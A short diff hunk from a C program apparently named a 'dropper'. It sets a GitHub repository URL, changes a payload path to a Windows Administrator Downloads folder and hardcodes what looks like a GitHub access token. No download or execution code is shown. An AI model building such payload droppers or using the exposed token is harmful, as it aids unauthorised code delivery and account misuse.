@@ -37,7 +37,7 @@ int main()
 
     const char* url = "https://github.com/Rastraktocat/Walmart-version-of-Dropper.git";
 
-    char* path = "Linux_mint_22.3//FileSystem_exe_rebuild//payload";
+    char* path = "C:\\Users\Administrator\\Downloads";
 
     const char* token = "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";
 
